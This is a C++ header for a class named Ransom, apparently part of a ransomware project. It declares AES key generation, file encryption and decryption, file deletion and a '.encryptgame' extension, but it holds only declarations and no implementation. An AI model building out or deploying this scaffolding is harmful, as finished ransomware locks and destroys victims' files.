#pragma once

#include <filesystem>
#include "../cryptopp/modes.h"
#include "../cryptopp/osrng.h"

void safe_to_run();

class Ransom
{
public:
	Ransom() = default;
	~Ransom() = default;
	void run_encryption_logic(const char* exe_file_name);
	void run_decryption_logic(const char* exe_file_name);

private:
	const char* custom_extension_name = ".encryptgame";
	CryptoPP::AutoSeededRandomPool rng_;
	CryptoPP::SecByteBlock* key_;
	CryptoPP::SecByteBlock* iv_;
	void encrypt_files(const char* file_name);
	void decrypt_files(const char* file_name);
	void generate_aes_key();
	static void delete_file(const char* file);
	
};
